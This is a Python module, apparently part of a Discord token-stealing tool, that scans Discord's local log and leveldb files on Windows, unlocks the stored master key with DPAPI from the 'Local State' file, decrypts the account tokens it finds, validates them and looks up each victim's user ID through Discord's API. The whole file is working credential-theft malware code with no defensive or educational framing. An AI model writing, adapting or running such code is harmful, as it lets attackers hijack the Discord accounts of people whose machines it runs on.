import os
import base64
import json
import re
import requests
from win32crypt import CryptUnprotectData
from modules.discord.discord_shared import validate_token, decrypt_value

class DiscordWindows:
    def __init__(self, paths):
        self.paths = paths

    def run(self) -> tuple:
        tokens, uids = self.__get_discord_tokens()
        return tokens, uids

    def __get_discord_tokens(self) -> tuple:
        tokens = []
        uids = []

        for cur_path in self.paths:
            for root, dirs, files in os.walk(cur_path):
                for file in files:
                    if file[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                        with open(os.path.join(root, file), errors="ignore") as f:
                            lines = [x.strip() for x in f.readlines() if x.strip()]
                    except Exception as e:
                        print(f"Error reading file {file}: {e}")
                        continue

                    for line in lines:
                        for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            master_key = self.__get_master_key(root)
                            if not master_key:
                                continue
                            token = decrypt_value(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), master_key)
                            if token and validate_token(token):
                                tokens.append(token)
                                uids.append(self.__get_user_id(token))

        return tokens, uids

    def __get_master_key(self, root: str) -> bytes:
        """Retrieve the master key for Windows."""
        local_state_path = os.path.join(os.path.dirname(root), "Local State")
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        except Exception as e:
            print(f"Error retrieving master key: {e}")
            return None

    def __get_user_id(self, token: str) -> str:
        """Retrieve the user ID from the Discord API."""
        response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
        return response.json().get("id", "")
